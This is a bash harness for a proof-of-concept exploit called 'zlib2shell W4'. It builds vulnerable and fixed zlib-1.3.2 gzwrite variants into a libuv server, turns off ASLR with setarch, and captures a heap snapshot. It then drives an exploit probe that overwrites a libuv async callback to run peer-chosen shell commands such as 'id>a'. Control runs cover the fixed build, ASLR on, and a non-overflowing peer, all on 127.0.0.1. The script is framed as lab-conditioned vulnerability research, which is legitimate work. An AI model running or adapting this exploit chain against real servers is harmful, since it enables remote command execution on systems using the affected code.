#!/usr/bin/env bash
# zlib2shell W4 — reproducible, lab-conditioned command execution through a
# real libuv async-handle callback rewritten by the stale gz_vacate() copy.
# Every socket is plant-started 127.0.0.1. ASLR is disabled and the peer
# replays a gdb-captured pre-memmove heap image; both are recorded conditions,
# not claims of a wire-only exploit. Benign commands only write "id" output to
# a file in --out.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(dirname "$HERE")
SRC=$ROOT/src
OUT=$HERE/uv-snap-evidence
mkdir -p "$OUT"
TRACE=$OUT/trace.txt
: > "$TRACE"

build() { # $1=variant $2=gzwrite source
    local d=/tmp/zlib2shell-uv-$1
    rm -rf "$d"; mkdir -p "$d"
    cp -r "$SRC/zlib-1.3.2/." "$d/"
    cp "$SRC/$2" "$d/gzwrite.c"
    (cd "$d" && CC=gcc CFLAGS='-g -O0 -fno-stack-protector' \
        ./configure --static >/dev/null 2>&1 && make -s -j4 >/dev/null 2>&1)
    gcc -g -O0 -fno-stack-protector -no-pie -I"$d" -I/usr/include \
        "$HERE/uv_server.c" "$d/libz.a" -luv -lpthread -ldl -o "$d/srv"
}

log() { printf '%s\n' "$*" | tee -a "$TRACE"; }

build vuln gzwrite.c.parent
build fixed gzwrite.c.fixed
VULN=/tmp/zlib2shell-uv-vuln/srv
FIXED=/tmp/zlib2shell-uv-fixed/srv
ARCH=$(uname -m)
WRAP=/tmp/zlib2shell-uv-snap-wrappers
mkdir -p "$WRAP"
printf '#!/bin/sh\nexec setarch %s -R %s "$@"\n' "$ARCH" "$VULN" > "$WRAP/srv-vuln-noaslr"
printf '#!/bin/sh\nexec setarch %s -R %s "$@"\n' "$ARCH" "$FIXED" > "$WRAP/srv-fixed-noaslr"
chmod +x "$WRAP/srv-vuln-noaslr" "$WRAP/srv-fixed-noaslr"

SNAP=$OUT/snapshot.bin
log "== capture pre-memmove image (ASLR off) =="
python3 "$HERE/capture_uv_snapshot.py" --binary "$VULN" \
    --out "$OUT/capture" --snapfile "$SNAP" --log "$OUT/capture.log" \
    | tee -a "$TRACE" >/dev/null
log "SNAPSHOT_BYTES=$(grep '^SNAPSHOT_BYTES=' "$OUT/capture.log" | tail -1 | cut -d= -f2)"

run_case() { # $1=name $2=binary $3=cmd $4=mode $5=extra env
    local name=$1 bin=$2 cmd=$3 mode=$4 extra=$5
    rm -rf "$OUT/$name"; mkdir -p "$OUT/$name"
    if [ "$mode" = safe ]; then
        env $extra python3 "$HERE/uv_probe.py" --binary "$bin" \
            --out "$OUT/$name" --mode safe --log "$OUT/$name.log" \
            > "$OUT/$name.stdout" 2>&1
    else
        env $extra python3 "$HERE/uv_probe.py" --binary "$bin" \
            --out "$OUT/$name" --mode exploit --delta 293440 \
            --snapshot "$SNAP" --cmd "$cmd" --log "$OUT/$name.log" \
            > "$OUT/$name.stdout" 2>&1
    fi
    local pat='^(SNAPSHOT|CRAFT_SRC|MARKER|REQ_BYTES|WRITTEN|PRINTF_RC|UV_SENT|UV_RAN|SERVER_DONE|SERVER_RC)='
    if [ "$name" = aslr-on ]; then
        pat='^(SNAPSHOT|MARKER|REQ_BYTES|WRITTEN|PRINTF_RC|UV_SENT|UV_RAN|SERVER_DONE|SERVER_RC)='
    fi
    grep -E "$pat" "$OUT/$name.stdout" >> "$TRACE"
    log "$name $(grep '^MARKER=' "$OUT/$name.stdout" | tail -1)"
}

log "== vulnerable + snapshot, id>a =="
run_case vuln-id-a "$WRAP/srv-vuln-noaslr" 'id>a' exploit ''
log "== vulnerable + snapshot, id>b (peer-chosen command) =="
run_case vuln-id-b "$WRAP/srv-vuln-noaslr" 'id>b' exploit ''
log "== fixed + snapshot =="
run_case fixed-id-a "$WRAP/srv-fixed-noaslr" 'id>a' exploit ''
log "== vulnerable + snapshot, original callback kept =="
run_case keep-cb "$WRAP/srv-vuln-noaslr" 'id>a' exploit KEEP_CB=1
log "== vulnerable + snapshot, ASLR on (stale libc pointers) =="
run_case aslr-on "$VULN" 'id>a' exploit ''
log "== vulnerable + draining peer (no overflow) =="
run_case safe-drain "$VULN" 'id>a' safe ''

(cd "$OUT" && sha256sum trace.txt) | tee -a "$TRACE"
